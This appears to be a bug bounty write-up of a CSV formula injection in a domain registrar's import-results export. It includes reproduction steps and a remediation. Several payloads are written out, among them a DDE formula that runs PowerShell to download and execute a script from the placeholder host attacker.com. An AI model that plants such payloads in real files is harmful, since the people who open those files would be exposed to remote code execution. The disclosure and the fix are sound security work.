---
title: "Epik: CSV Formula Injection in Domain Import Results (Parking Title field) to RCE"
date: 2026-10-15
categories: [Web, CSV-Injection]
severiry: [P3 - but P2 in old exel version Enable command execution]
tags: [csv-injection, csv, injection, formula, formula-injection, P3, RCE, fixed]
---
 
## Target
 
**Epik** is a US-based domain registrar, a company where people buy, register, and manage domain names, competing with GoDaddy, Namecheap, and similar. It also offers hosting, a marketplace for buying/selling domains, and domain parking services (monetizing unused domains).
 
**Status: Private**: Reported to the program.
 
 
Summary
-------
The domain import functionality on registrar.epik.com allows a user to upload a CSV file containing a malicious formula in the Parking Title field.

When the import is processed (even if the domain is not associated with the account), the application reflects the unsanitized value in the downloadable results CSV (import-result-XXXXX.csv).

When this file is opened in Microsoft Excel, the formula is interpreted and multiple security warnings are triggered (DDE / external links). On older versions of Excel or systems with DDE enabled, this can lead to arbitrary command execution.


Steps to Reproduce
------------------
1. Log in to https://registrar.epik.com
2. Go to the domain import / bulk update feature that accepts a CSV file.
3. Create a CSV file with the following content via Burpsuite:

![import](/epik-import.png)

```
Domain,Parking Title
```
```
test.com,=1+1
```

![import](/epik-burp.png)

#### You can use different payloads:

- =cmd|'/c whoami'!A1 (RCE)
- =cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0 (RCE to attacker domain allow malware download)

4. Upload the CSV.
5. After processing, download the results file (e.g. import-result-94305.csv or “Download All Results” / “Download Domains with Errors”).
   
![import](/epik-download-csv.png)

7. Open the downloaded CSV with Microsoft Excel.
   

![import](/epik-exel.png)

#### Observed Result:
Excel shows the value of 1+1 = 2. The malicious formula is present in the “Parking Title” column.


Proof of Concept
----------------
### Payload used:

```
=1+1
```

### More dangerous variant (for impact demonstration):

```
=cmd|'/c whoami'!A1
```
or this more critical for RCE

```
=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
```

Even when the domain is not associated with the account (ERROR: Domain not associated with this Epik account), the formula is still written into the exported CSV without sanitization.


Impact
------
- An attacker can generate a malicious CSV through Epik’s own platform.
- The resulting file can be shared with third parties (partners, buyers, accountants, etc.) via email, messaging apps, or cloud storage.
- Recipients do not need an Epik account or to visit the website, they only need to open the CSV.
- On modern Excel the payload is usually blocked by default (DDE disabled).
- On older Excel versions (2016 and earlier) or systems where DDE is enabled, arbitrary command execution is possible.

Given that Epik is a domain registrar and users frequently share domain-related reports, this increases the realistic attack surface beyond simple self-exploitation.


Recommended Remediation
-----------------------
When generating any CSV export, sanitize cells that begin with the following characters:

- =
- (+)
- (-)
- @

The most common and effective fix is to prefix the value with a single quote ('), forcing Excel to treat it as text.

### Example:
=cmd|...  →  '=cmd|...
